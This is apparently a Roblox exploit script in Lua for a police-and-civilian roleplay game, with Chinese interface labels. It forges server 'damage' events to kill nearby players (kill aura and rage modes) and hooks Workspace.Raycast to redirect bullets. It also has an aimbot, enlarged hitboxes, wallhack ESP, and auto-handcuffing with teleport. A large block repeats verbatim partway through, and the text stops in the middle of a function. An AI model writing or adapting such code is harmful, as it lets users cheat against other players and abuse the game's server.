local CombatConfig = {
	auraEnabled = false,
	auraRange = 50,
	auraDamage = 5,
	auraInterval = 0.05,
	auraOnlyPolice = false,
	auraOnlyCivilian = false,
	auraCombatCheck = false,
	bulletEnabled = false,
	bulletFov = 360,
	bulletDistance = 300,
	bulletPart = "Head",
	bulletShowFov = true,
	bulletColor = "红色",
	bulletCombatCheck = false,
	bulletOnlyPolice = false,
	bulletOnlyCivilian = false,
}
local function targetAllowed(player, onlyPolice, onlyCivilian)
	if not player or player == LocalPlayer then
		return false
	end
	if onlyPolice then
		return player.Team and player.Team.Name == "Police"
	end
	if onlyCivilian then
		return player.Team and player.Team.Name == "Civilian"
	end
	return true
end
local function inCombat(player, enabled)
	if not enabled then
		return true
	end
	return player:GetAttribute("CombatMode") == true or player:GetAttribute("Pursuit") == true
end
local auraLast = 0
RunService.Heartbeat:Connect(function()
	if not CombatConfig.auraEnabled or not PlayerEvent then
		return
	end
	local now = tick()
	if now - auraLast < CombatConfig.auraInterval then
		return
	end
	local _, _, myRoot = GetCharacter(LocalPlayer)
	if not myRoot then
		return
	end
	local nearest, nearestDist
	for _, player in ipairs(Players:GetPlayers()) do
		if targetAllowed(player, CombatConfig.auraOnlyPolice, CombatConfig.auraOnlyCivilian) and IsAlive(player) and inCombat(player, CombatConfig.auraCombatCheck) then
			local _, _, root = GetCharacter(player)
			if root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist <= CombatConfig.auraRange and (not nearestDist or dist < nearestDist) then
					nearestDist = dist
					nearest = player
				end
			end
		end
	end
	if nearest then
		local _, _, root = GetCharacter(nearest)
		local myPos = myRoot.Position
		pcall(function()
			PlayerEvent:FireServer("damage", {
				bodyParts = {
					{
						"Head",
						1
					}
				},
				shotCode = {
					myPos,
					(root.Position - myPos).Unit
				},
				pos = root.Position,
				target = nearest,
				damageFactor = CombatConfig.auraDamage,
				bulletProofTool = false,
			})
		end)
		auraLast = now
	end
end)
local BulletFOV = Drawing.new("Circle")
BulletFOV.Filled = false
BulletFOV.NumSides = 64
BulletFOV.Visible = false
local function getBulletTarget()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local bestPos, bestFov = nil, CombatConfig.bulletFov
	for _, player in ipairs(Players:GetPlayers()) do
		if targetAllowed(player, CombatConfig.bulletOnlyPolice, CombatConfig.bulletOnlyCivilian) and IsAlive(player) and inCombat(player, CombatConfig.bulletCombatCheck) then
			local char = player.Character
			local part = char and (char:FindFirstChild(CombatConfig.bulletPart) or char:FindFirstChild("HumanoidRootPart"))
			if part then
				local dist = (part.Position - camera.CFrame.Position).Magnitude
				if dist <= CombatConfig.bulletDistance then
					local screen, onScreen = camera:WorldToScreenPoint(part.Position)
					if onScreen and screen.Z > 0 then
						local fov = (Vector2.new(screen.X, screen.Y) - center).Magnitude
						if fov < bestFov then
							bestFov = fov
							bestPos = part.Position
						end
					end
				end
			end
		end
	end
	return bestPos
end
pcall(function()
	local oldRaycast = Workspace.Raycast
	hookfunction(Workspace.Raycast, function(self, origin, direction, params)
		if CombatConfig.bulletEnabled and origin and direction then
			local _, _, root = GetCharacter(LocalPlayer)
			if root and (origin - root.Position).Magnitude < 15 then
				local target = getBulletTarget()
				if target then
					direction = (target - origin).Unit * direction.Magnitude
				end
			end
		end
		return oldRaycast(self, origin, direction, params)
	end)
end)
RunService.RenderStepped:Connect(function()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	BulletFOV.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	BulletFOV.Radius = CombatConfig.bulletFov
	BulletFOV.Thickness = 2
	BulletFOV.Color = GetColor(CombatConfig.bulletColor)
	BulletFOV.Visible = CombatConfig.bulletEnabled and CombatConfig.bulletShowFov
end)
local AimConfig = {
	enabled = false,
	prediction = false,
	teamCheck = false,
	wallCheck = false,
	showFov = false,
	showCrosshair = false,
	showTracer = false,
	friendCheck = false,
	onlyPolice = false,
	onlyCivilian = false,
	combatCheck = false,
	fov = 50,
	smoothness = 1,
	targetMode = "准心最近",
	targetPart = "头",
	color = "红色",
	fovThickness = 2,
}
local AimFOV = Drawing.new("Circle")
AimFOV.Filled = false
AimFOV.NumSides = 64
local AimTracer = Drawing.new("Line")
local AimCrosshair = {
	Top = Drawing.new("Line"),
	Bottom = Drawing.new("Line"),
	Left = Drawing.new("Line"),
	Right = Drawing.new("Line"),
	Center = Drawing.new("Line")
}
for _, line in pairs(AimCrosshair) do
	line.Thickness = 2;
	line.Visible = false
end
local PartMap = {
	["头"] = {
		"Head"
	},
	["胸"] = {
		"UpperTorso",
		"Torso"
	},
	["左手"] = {
		"LeftHand",
		"Left Arm"
	},
	["右手"] = {
		"RightHand",
		"Right Arm"
	},
	["左腿"] = {
		"LeftFoot",
		"Left Leg"
	},
	["右腿"] = {
		"RightFoot",
		"Right Leg"
	}
}
local function aimTargetPart(char)
	for _, name in ipairs(PartMap[AimConfig.targetPart] or {
		"Head"
	}) do
		local part = char:FindFirstChild(name)
		if part then
			return part
		end
	end
	return char:FindFirstChild("HumanoidRootPart")
end
local function aimVisible(part)
	if not AimConfig.wallCheck then
		return true
	end
	local camera = Workspace.CurrentCamera
	local params = RaycastParams.new()
	params.FilterDescendantsInstances = {
		LocalPlayer.Character,
		camera
	}
	params.FilterType = Enum.RaycastFilterType.Exclude
	params.IgnoreWater = true
	local hit = Workspace:Raycast(camera.CFrame.Position, part.Position - camera.CFrame.Position, params)
	return not hit or hit.Instance:IsDescendantOf(part.Parent)
end
local function getBestAimTarget()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local best, bestValue
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and IsAlive(player) and targetAllowed(player, AimConfig.onlyPolice, AimConfig.onlyCivilian) and inCombat(player, AimConfig.combatCheck) then
			if AimConfig.teamCheck and LocalPlayer.Team and player.Team == LocalPlayer.Team then
				continue
			end
			if AimConfig.friendCheck then
				local ok, friend = pcall(function()
					return LocalPlayer:IsFriendsWith(player.UserId)
				end)
				if ok and friend then
					continue
				end
			end
			local char = player.Character
			local part = char and aimTargetPart(char)
			local _, hum, root = GetCharacter(player)
			if part and hum and root and aimVisible(part) then
				local screen, onScreen = camera:WorldToViewportPoint(part.Position)
				if onScreen then
					local fov = (Vector2.new(screen.X, screen.Y) - center).Magnitude
					if fov <= AimConfig.fov then
						local score
						if AimConfig.targetMode == "距离最近" then
							local _, _, myRoot = GetCharacter(LocalPlayer)
							score = myRoot and (myRoot.Position - root.Position).Magnitude or math.huge
						elseif AimConfig.targetMode == "血量最低" then
							score = hum.Health
						else
							score = fov
						end
						if not bestValue or score < bestValue then
							bestValue = score
							best = {
								player = player,
								part = part,
								screen = screen
							}
						end
					end
				end
			end
		end
	end
	return best
end
RunService.RenderStepped:Connect(function(dt)
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local color = GetColor(AimConfig.color)
	AimFOV.Position = center
	AimFOV.Radius = AimConfig.fov
	AimFOV.Thickness = AimConfig.fovThickness
	AimFOV.Color = color
	AimFOV.Visible = AimConfig.enabled and AimConfig.showFov
	local gap, size = 5, 15
	AimCrosshair.Top.From = Vector2.new(center.X, center.Y - gap)
	AimCrosshair.Top.To = Vector2.new(center.X, center.Y - gap - size)
	AimCrosshair.Bottom.From = Vector2.new(center.X, center.Y + gap)
	AimCrosshair.Bottom.To = Vector2.new(center.X, center.Y + gap + size)
	AimCrosshair.Left.From = Vector2.new(center.X - gap, center.Y)
	AimCrosshair.Left.To = Vector2.new(center.X - gap - size, center.Y)
	AimCrosshair.Right.From = Vector2.new(center.X + gap, center.Y)
	AimCrosshair.Right.To = Vector2.new(center.X + gap + size, center.Y)
	AimCrosshair.Center.From = Vector2.new(center.X - 2, center.Y)
	AimCrosshair.Center.To = Vector2.new(center.X + 2, center.Y)
	for _, line in pairs(AimCrosshair) do
		line.Color = color
		line.Visible = AimConfig.showCrosshair
	end
	AimTracer.Visible = false
	if AimConfig.enabled then
		local target = getBestAimTarget()
		if target then
			if AimConfig.showTracer then
				AimTracer.From = center
				AimTracer.To = Vector2.new(target.screen.X, target.screen.Y)
				AimTracer.Color = color
				AimTracer.Thickness = 2
				AimTracer.Transparency = 0.5
				AimTracer.Visible = true
			end
			local targetPos = target.part.Position
			if AimConfig.prediction then
				targetPos = targetPos + target.part.AssemblyLinearVelocity * dt * 1.5
			end
			local targetCF = CFrame.new(camera.CFrame.Position, targetPos)
			camera.CFrame = AimConfig.smoothness >= 1 and targetCF or camera.CFrame:Lerp(targetCF, AimConfig.smoothness)
		end
	end
end)
local RageConfig = {
	enabled = false,
	range = 150,
	interval = 0.05,
	bodyPart = "Head",
	jobCheck = false,
	wallCheck = false,
	aliveCheck = false,
	combatCheck = false,
	policeLock = false,
	civilianLock = false,
	beam = false,
}
local RageBodyParts = {
	["头部"] = "Head",
	["躯干"] = "Torso",
	["左臂"] = "LeftArm",
	["右臂"] = "RightArm",
	["左腿"] = "LeftLeg",
	["右腿"] = "RightLeg"
}
local function createBeam(startPos, endPos)
	local p1 = Instance.new("Part")
	local p2 = Instance.new("Part")
	for _, p in ipairs({
		p1,
		p2
	}) do
		p.Anchored = true;
		p.CanCollide = false;
		p.Transparency = 1;
		p.Size = Vector3.new(0.1, 0.1, 0.1);
		p.Parent = Workspace
	end
	p1.Position = startPos;
	p2.Position = endPos
	local a1 = Instance.new("Attachment", p1)
	local a2 = Instance.new("Attachment", p2)
	local beam = Instance.new("Beam", p1)
	beam.Attachment0 = a1;
	beam.Attachment1 = a2;
	beam.Width0 = 0.15;
	beam.Width1 = 0.15
	beam.Color = ColorSequence.new(Color3.fromRGB(180, 200, 255))
	task.delay(0.8, function()
		pcall(function()
			p1:Destroy();
			p2:Destroy()
		end)
	end)
end
task.spawn(function()
	while true do
		if RageConfig.enabled and PlayerEvent then
			local _, _, myRoot = GetCharacter(LocalPlayer)
			if myRoot then
				EquipWeapon()
				local myPos = myRoot.Position
				local myJob = GetPlayerJob(LocalPlayer)
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and targetAllowed(player, RageConfig.policeLock, RageConfig.civilianLock) and inCombat(player, RageConfig.combatCheck) then
						local char, hum, root = GetCharacter(player)
						if char and hum and root and hum.Health > 0 then
							if RageConfig.jobCheck and GetPlayerJob(player) == myJob then
								continue
							end
							if (root.Position - myPos).Magnitude <= RageConfig.range then
								if RageConfig.wallCheck then
									local params = RaycastParams.new()
									params.FilterDescendantsInstances = {
										LocalPlayer.Character,
										Workspace.CurrentCamera
									}
									params.FilterType = Enum.RaycastFilterType.Exclude
									local hit = Workspace:Raycast(Workspace.CurrentCamera.CFrame.Position, root.Position - Workspace.CurrentCamera.CFrame.Position, params)
									if hit and not hit.Instance:IsDescendantOf(char) then
										continue
									end
								end
								pcall(function()
									PlayerEvent:FireServer("damage", {
										bodyParts = {
											{
												RageConfig.bodyPart,
												1
											}
										},
										shotCode = {
											myPos,
											(root.Position - myPos).Unit
										},
										pos = root.Position,
										target = player,
										damageFactor = 1.5,
										bulletProofTool = false,
									})
									if RageConfig.beam then
										createBeam(myPos, root.Position)
									end
								end)
							end
						end
					end
				end
			end
		end
		task.wait(RageConfig.interval)
	end
end)
local HitboxConfig = {
	active = false,
	size = 10,
	transparency = 0.7,
	teamCheck = false,
	color = "红色",
	material = "Neon",
	rainbow = false,
	checkCorpses = false,
	outline = false,
	collision = false,
	glow = false,
	pulse = false,
	affectNPC = false,
}
local hitboxOriginal = {}
local function resetHitbox(char)
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	local orig = hitboxOriginal[root]
	if orig then
		root.Size = orig.Size
		root.Transparency = orig.Transparency
		root.Material = orig.Material
		root.CanCollide = orig.CanCollide
		root.Color = orig.Color
	end
	local h = root:FindFirstChild("乔尼_HitboxHighlight")
	if h then
		h:Destroy()
	end
	local l = root:FindFirstChild("乔尼_HitboxLight")
	if l then
		l:Destroy()
	end
end
local function applyHitbox(char)
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	if not hitboxOriginal[root] then
		hitboxOriginal[root] = {
			Size = root.Size,
			Transparency = root.Transparency,
			Material = root.Material,
			CanCollide = root.CanCollide,
			Color = root.Color
		}
	end
	if not HitboxConfig.active then
		resetHitbox(char);
		return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if HitboxConfig.checkCorpses and hum and hum.Health <= 0 then
		resetHitbox(char);
		return
	end
	local size = HitboxConfig.size
	if HitboxConfig.pulse then
		size = size * (math.sin(tick() * 2) * 0.2 + 1)
	end
	root.Size = Vector3.new(size, size, size)
	root.Transparency = HitboxConfig.transparency
	root.Material = Enum.Material[HitboxConfig.material] or Enum.Material.Neon
	root.CanCollide = HitboxConfig.collision
	root.Color = HitboxConfig.rainbow and GetRainbowColor(5) or GetColor(HitboxConfig.color)
	if HitboxConfig.outline then
		local hl = root:FindFirstChild("乔尼_HitboxHighlight") or Instance.new("Highlight")
		hl.Name = "乔尼_HitboxHighlight"
		hl.FillTransparency = 1
		hl.OutlineColor = root.Color
		hl.OutlineTransparency = HitboxConfig.transparency
		hl.Parent = root
	else
		local hl = root:FindFirstChild("乔尼_HitboxHighlight")
		if hl then
			hl:Destroy()
		end
	end
	if HitboxConfig.glow then
		local light = root:FindFirstChild("乔尼_HitboxLight") or Instance.new("PointLight")
		light.Name = "乔尼_HitboxLight"
		light.Brightness = 5
		light.Range = 15
		light.Color = root.Color
		light.Parent = root
	else
		local light = root:FindFirstChild("乔尼_HitboxLight")
		if light then
			light:Destroy()
		end
	end
end
RunService.Heartbeat:Connect(function()
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			if HitboxConfig.teamCheck and LocalPlayer.Team and player.Team == LocalPlayer.Team then
				resetHitbox(player.Character)
			else
				applyHitbox(player.Character)
			end
		end
	end
	if HitboxConfig.affectNPC then
		for _, obj in ipairs(Workspace:GetDescendants()) do
			if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") and not Players:GetPlayerFromCharacter(obj) then
				applyHitbox(obj)
			end
		end
	end
end)
local ESP = {
	enabled = false,
	name = true,
	distance = true,
	health = true,
	highlight = true,
	tracer = false,
	tracerOrigin = "屏幕底部",
	showFugitive = true,
	selectedTeams = {
		Chef = true,
		Civilian = true,
		Delivery = true,
		Farmer = true,
		Fire = true,
		Police = true,
		Medical = true,
		Prisoner = true,
		["Road Service"] = true,
		Transit = true
	},
	trackers = {},
}
local TeamNames = {
	Chef = "厨师",
	Civilian = "平民",
	Delivery = "配送员",
	Farmer = "农民",
	Fire = "消防员",
	Police = "警察",
	Medical = "医护人员",
	Prisoner = "囚犯",
	["Road Service"] = "道路服务",
	Transit = "交通"
}
local TeamColors = {
	Chef = Color3.fromRGB(255, 200, 0),
	Civilian = Color3.fromRGB(100, 200, 255),
	Delivery = Color3.fromRGB(255, 150, 50),
	Farmer = Color3.fromRGB(50, 200, 50),
	Fire = Color3.fromRGB(255, 50, 50),
	Police = Color3.fromRGB(50, 100, 255),
	Medical = Color3.fromRGB(255, 50, 255),
	Prisoner = Color3.fromRGB(255, 150, 150),
	["Road Service"] = Color3.fromRGB(255, 255, 100),
	Transit = Color3.fromRGB(100, 255, 255)
}
local function isFugitive(player)
	return player.Team and player.Team.Name == "Civilian" and (player:GetAttribute("CombatMode") or player:GetAttribute("Pursuit"))
end
local function espAllowed(player)
	if not ESP.enabled or player == LocalPlayer or not player.Character then
		return false
	end
	if ESP.showFugitive and isFugitive(player) then
		return true
	end
	local team = player.Team and player.Team.Name
	return team and ESP.selectedTeams[team] == true
end
local function removeESP(player)
	local t = ESP.trackers[player]
	if not t then
		return
	end
	for _, obj in pairs(t) do
		pcall(function()
			if typeof(obj) == "RBXScriptConnection" then
				obj:Disconnect()
			elseif typeof(obj) == "Instance" then
				obj:Destroy()
			elseif type(obj) == "userdata" and obj.Remove then
				obj:Remove()
			end
		end)
	end
	ESP.trackers[player] = nil
end
local function createESP(player)
	removeESP(player)
	if not espAllowed(player) then
		return
	end
	local char = player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then
		return
	end
	local uiParent = UI_PARENT or resolveGuiParent()
	if not uiParent then
		return
	end
	local bill = Instance.new("BillboardGui")
	bill.Name = "PlayerESP_" .. player.Name
	bill.AlwaysOnTop = true
	bill.Size = UDim2.new(4, 0, 4, 0)
	bill.StudsOffset = Vector3.new(0, 3, 0)
	bill.Adornee = root
	bill.Parent = uiParent
	local frame = Instance.new("Frame")
	frame.BackgroundTransparency = 1
	frame.Size = UDim2.fromScale(1, 1)
	frame.Parent = bill
	local name = Instance.new("TextLabel")
	name.Size = UDim2.new(1, 0, 0.5, 0)
	name.BackgroundTransparency = 1
	name.Font = Enum.Font.SourceSansBold
	name.TextSize = 14
	name.TextStrokeTransparency = 0.5
	name.Parent = frame
	local info = Instance.new("TextLabel")
	info.Size = UDim2.new(1, 0, 0.5, 0)
	info.Position = UDim2.new(0, 0, 0.5, 0)
	info.BackgroundTransparency = 1
	info.Font = Enum.Font.SourceSans
	info.TextSize = 12
	info.TextStrokeTransparency = 0.5
	info.Parent = frame
	local highlight = Instance.new("Highlight")
	highlight.Name = "PlayerESP_Highlight"
	highlight.Adornee = char
	highlight.FillTransparency = 0.7
	highlight.OutlineTransparency = 0
	highlight.Parent = uiParent
	local tracer = Drawing.new("Line")
	tracer.Thickness = 1
	tracer.Transparency = 0.5
	tracer.Visible = false
	local update = RunService.Heartbeat:Connect(function()
		if not espAllowed(player) or not player.Character or not root.Parent then
			tracer.Visible = false
			if bill.Parent then
				bill.Enabled = false
			end
			return
		end
		bill.Enabled = true
		local fug = ESP.showFugitive and isFugitive(player)
		local team = player.Team and player.Team.Name
		local color = fug and Color3.fromRGB(255, 0, 0) or TeamColors[team] or Color3.fromRGB(0, 255, 0)
		local teamName = fug and "逃犯" or TeamNames[team] or (team or "未知")
		name.Text = "[" .. teamName .. "] " .. player.Name
		name.TextColor3 = color
		name.Visible = ESP.name
		highlight.FillColor = color
		highlight.OutlineColor = color
		highlight.Enabled = ESP.highlight
		local _, hum = GetCharacter(player)
		local _, _, myRoot = GetCharacter(LocalPlayer)
		local parts = {}
		if ESP.distance and myRoot then
			table.insert(parts, string.format("%.1f", (myRoot.Position - root.Position).Magnitude))
		end
		if ESP.health and hum then
			table.insert(parts, tostring(math.floor(hum.Health)))
		end
		info.Text = # parts > 0 and ("[" .. table.concat(parts, "/") .. "]") or ""
		info.TextColor3 = color
		info.Visible = ESP.distance or ESP.health
		local cam = Workspace.CurrentCamera
		if ESP.tracer and cam then
			local screen, onScreen = cam:WorldToViewportPoint(root.Position)
			if onScreen then
				local vp = cam.ViewportSize
				if ESP.tracerOrigin == "屏幕中心" then
					tracer.From = Vector2.new(vp.X / 2, vp.Y / 2)
				elseif ESP.tracerOrigin == "屏幕顶部" then
					tracer.From = Vector2.new(vp.X / 2, 0)
				else
					tracer.From = Vector2.new(vp.X / 2, vp.Y)
				end
				tracer.To = Vector2.new(screen.X, screen.Y)
				tracer.Color = color
				tracer.Visible = true
			else
				tracer.Visible = false
			end
		else
			tracer.Visible = false
		end
	end)
	ESP.trackers[player] = {
		bill = bill,
		highlight = highlight,
		tracer = tracer,
		update = update
	}
end
local function refreshESP()
	for player in pairs(ESP.trackers) do
		if not espAllowed(player) then
			removeESP(player)
		end
	end
	if ESP.enabled then
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and espAllowed(player) and not ESP.trackers[player] then
				createESP(player)
			end
		end
	end
end
Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function()
		task.wait(0.5)
		if ESP.enabled then
			createESP(player)
		end
	end)
end)
Players.PlayerRemoving:Connect(removeESP)
RunService.Heartbeat:Connect(function()
	if ESP.enabled then
		refreshESP()
	end
end)
local PoliceConfig = {
	range = 200,
	delay = 0.5,
	combatCheck = false,
	teleport = false
}
local autoCuffThread
local function startAutoCuff()
	if autoCuffThread then
		return
	end
	autoCuffThread = task.spawn(function()
		while State.autoCuff do
			local _, _, myRoot = GetCharacter(LocalPlayer)
			if myRoot and PlayerFunc then
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and IsAlive(player) and inCombat(player, PoliceConfig.combatCheck) then
						local _, _, root = GetCharacter(player)
						if root and (root.Position - myRoot.Position).Magnitude <= PoliceConfig.range then
							pcall(function()
								PlayerFunc:InvokeServer("handcuff", player, false)
							end)
						end
					end
				end
				if PoliceConfig.teleport then
					local nearest, nearestDist
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= LocalPlayer and player.Team and player.Team.Name == "Civilian" and (player:GetAttribute("WantedLevel") or 0) > 0 then
							local _, _, root = GetCharacter(player)
							if root then
								local d = (root.Position - myRoot.Position).Magnitude
								if d <= PoliceConfig.range and (not nearestDist or d < nearestDist) then
									nearest, nearestDist = player, d
								end
							end
						end
					end
					if nearest then
						local _, _, targetRoot = GetCharacter(nearest)
						if targetRoot then
							myRoot.CFrame = CFrame.new(targetRoot.Position - targetRoot.CFrame.LookVector * 3)
						end
					end
				end
			end
			task.wait(PoliceConfig.delay)
		end
		autoCuffThread = nil
	end)
end
local CombatConfig = {
	auraEnabled = false,
	auraRange = 50,
	auraDamage = 5,
	auraInterval = 0.05,
	auraOnlyPolice = false,
	auraOnlyCivilian = false,
	auraCombatCheck = false,
	bulletEnabled = false,
	bulletFov = 360,
	bulletDistance = 300,
	bulletPart = "Head",
	bulletShowFov = true,
	bulletColor = "红色",
	bulletCombatCheck = false,
	bulletOnlyPolice = false,
	bulletOnlyCivilian = false,
}
local function targetAllowed(player, onlyPolice, onlyCivilian)
	if not player or player == LocalPlayer then
		return false
	end
	if onlyPolice then
		return player.Team and player.Team.Name == "Police"
	end
	if onlyCivilian then
		return player.Team and player.Team.Name == "Civilian"
	end
	return true
end
local function inCombat(player, enabled)
	if not enabled then
		return true
	end
	return player:GetAttribute("CombatMode") == true or player:GetAttribute("Pursuit") == true
end
local auraLast = 0
RunService.Heartbeat:Connect(function()
	if not CombatConfig.auraEnabled or not PlayerEvent then
		return
	end
	local now = tick()
	if now - auraLast < CombatConfig.auraInterval then
		return
	end
	local _, _, myRoot = GetCharacter(LocalPlayer)
	if not myRoot then
		return
	end
	local nearest, nearestDist
	for _, player in ipairs(Players:GetPlayers()) do
		if targetAllowed(player, CombatConfig.auraOnlyPolice, CombatConfig.auraOnlyCivilian) and IsAlive(player) and inCombat(player, CombatConfig.auraCombatCheck) then
			local _, _, root = GetCharacter(player)
			if root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist <= CombatConfig.auraRange and (not nearestDist or dist < nearestDist) then
					nearestDist = dist
					nearest = player
				end
			end
		end
	end
	if nearest then
		local _, _, root = GetCharacter(nearest)
		local myPos = myRoot.Position
		pcall(function()
			PlayerEvent:FireServer("damage", {
				bodyParts = {
					{
						"Head",
						1
					}
				},
				shotCode = {
					myPos,
					(root.Position - myPos).Unit
				},
				pos = root.Position,
				target = nearest,
				damageFactor = CombatConfig.auraDamage,
				bulletProofTool = false,
			})
		end)
		auraLast = now
	end
end)
local BulletFOV = Drawing.new("Circle")
BulletFOV.Filled = false
BulletFOV.NumSides = 64
BulletFOV.Visible = false
local function getBulletTarget()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local bestPos, bestFov = nil, CombatConfig.bulletFov
	for _, player in ipairs(Players:GetPlayers()) do
		if targetAllowed(player, CombatConfig.bulletOnlyPolice, CombatConfig.bulletOnlyCivilian) and IsAlive(player) and inCombat(player, CombatConfig.bulletCombatCheck) then
			local char = player.Character
			local part = char and (char:FindFirstChild(CombatConfig.bulletPart) or char:FindFirstChild("HumanoidRootPart"))
			if part then
				local dist = (part.Position - camera.CFrame.Position).Magnitude
				if dist <= CombatConfig.bulletDistance then
					local screen, onScreen = camera:WorldToScreenPoint(part.Position)
					if onScreen and screen.Z > 0 then
						local fov = (Vector2.new(screen.X, screen.Y) - center).Magnitude
						if fov < bestFov then
							bestFov = fov
							bestPos = part.Position
						end
					end
				end
			end
		end
	end
	return bestPos
end
pcall(function()
	local oldRaycast = Workspace.Raycast
	hookfunction(Workspace.Raycast, function(self, origin, direction, params)
		if CombatConfig.bulletEnabled and origin and direction then
			local _, _, root = GetCharacter(LocalPlayer)
			if root and (origin - root.Position).Magnitude < 15 then
				local target = getBulletTarget()
				if target then
					direction = (target - origin).Unit * direction.Magnitude
				end
			end
		end
		return oldRaycast(self, origin, direction, params)
	end)
end)
RunService.RenderStepped:Connect(function()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	BulletFOV.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	BulletFOV.Radius = CombatConfig.bulletFov
	BulletFOV.Thickness = 2
	BulletFOV.Color = GetColor(CombatConfig.bulletColor)
	BulletFOV.Visible = CombatConfig.bulletEnabled and CombatConfig.bulletShowFov
end)
local AimConfig = {
	enabled = false,
	prediction = false,
	teamCheck = false,
	wallCheck = false,
	showFov = false,
	showCrosshair = false,
	showTracer = false,
	friendCheck = false,
	onlyPolice = false,
	onlyCivilian = false,
	combatCheck = false,
	fov = 50,
	smoothness = 1,
	targetMode = "准心最近",
	targetPart = "头",
	color = "红色",
	fovThickness = 2,
}
local AimFOV = Drawing.new("Circle")
AimFOV.Filled = false
AimFOV.NumSides = 64
local AimTracer = Drawing.new("Line")
local AimCrosshair = {
	Top = Drawing.new("Line"),
	Bottom = Drawing.new("Line"),
	Left = Drawing.new("Line"),
	Right = Drawing.new("Line"),
	Center = Drawing.new("Line")
}
for _, line in pairs(AimCrosshair) do
	line.Thickness = 2;
	line.Visible = false
end
local PartMap = {
	["头"] = {
		"Head"
	},
	["胸"] = {
		"UpperTorso",
		"Torso"
	},
	["左手"] = {
		"LeftHand",
		"Left Arm"
	},
	["右手"] = {
		"RightHand",
		"Right Arm"
	},
	["左腿"] = {
		"LeftFoot",
		"Left Leg"
	},
	["右腿"] = {
		"RightFoot",
		"Right Leg"
	}
}
local function aimTargetPart(char)
	for _, name in ipairs(PartMap[AimConfig.targetPart] or {
		"Head"
	}) do
		local part = char:FindFirstChild(name)
		if part then
			return part
		end
	end
	return char:FindFirstChild("HumanoidRootPart")
end
local function aimVisible(part)
	if not AimConfig.wallCheck then
		return true
	end
	local camera = Workspace.CurrentCamera
	local params = RaycastParams.new()
	params.FilterDescendantsInstances = {
		LocalPlayer.Character,
		camera
	}
	params.FilterType = Enum.RaycastFilterType.Exclude
	params.IgnoreWater = true
	local hit = Workspace:Raycast(camera.CFrame.Position, part.Position - camera.CFrame.Position, params)
	return not hit or hit.Instance:IsDescendantOf(part.Parent)
end
local function getBestAimTarget()
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local best, bestValue
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and IsAlive(player) and targetAllowed(player, AimConfig.onlyPolice, AimConfig.onlyCivilian) and inCombat(player, AimConfig.combatCheck) then
			if AimConfig.teamCheck and LocalPlayer.Team and player.Team == LocalPlayer.Team then
				continue
			end
			if AimConfig.friendCheck then
				local ok, friend = pcall(function()
					return LocalPlayer:IsFriendsWith(player.UserId)
				end)
				if ok and friend then
					continue
				end
			end
			local char = player.Character
			local part = char and aimTargetPart(char)
			local _, hum, root = GetCharacter(player)
			if part and hum and root and aimVisible(part) then
				local screen, onScreen = camera:WorldToViewportPoint(part.Position)
				if onScreen then
					local fov = (Vector2.new(screen.X, screen.Y) - center).Magnitude
					if fov <= AimConfig.fov then
						local score
						if AimConfig.targetMode == "距离最近" then
							local _, _, myRoot = GetCharacter(LocalPlayer)
							score = myRoot and (myRoot.Position - root.Position).Magnitude or math.huge
						elseif AimConfig.targetMode == "血量最低" then
							score = hum.Health
						else
							score = fov
						end
						if not bestValue or score < bestValue then
							bestValue = score
							best = {
								player = player,
								part = part,
								screen = screen
							}
						end
					end
				end
			end
		end
	end
	return best
end
RunService.RenderStepped:Connect(function(dt)
	local camera = Workspace.CurrentCamera
	if not camera then
		return
	end
	local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
	local color = GetColor(AimConfig.color)
	AimFOV.Position = center
	AimFOV.Radius = AimConfig.fov
	AimFOV.Thickness = AimConfig.fovThickness
	AimFOV.Color = color
	AimFOV.Visible = AimConfig.enabled and AimConfig.showFov
	local gap, size = 5, 15
	AimCrosshair.Top.From = Vector2.new(center.X, center.Y - gap)
	AimCrosshair.Top.To = Vector2.new(center.X, center.Y - gap - size)
	AimCrosshair.Bottom.From = Vector2.new(center.X, center.Y + gap)
	AimCrosshair.Bottom.To = Vector2.new(center.X, center.Y + gap + size)
	AimCrosshair.Left.From = Vector2.new(center.X - gap, center.Y)
	AimCrosshair.Left.To = Vector2.new(center.X - gap - size, center.Y)
	AimCrosshair.Right.From = Vector2.new(center.X + gap, center.Y)
	AimCrosshair.Right.To = Vector2.new(center.X + gap + size, center.Y)
	AimCrosshair.Center.From = Vector2.new(center.X - 2, center.Y)
	AimCrosshair.Center.To = Vector2.new(center.X + 2, center.Y)
	for _, line in pairs(AimCrosshair) do
		line.Color = color
		line.Visible = AimConfig.showCrosshair
	end
	AimTracer.Visible = false
	if AimConfig.enabled then
		local target = getBestAimTarget()
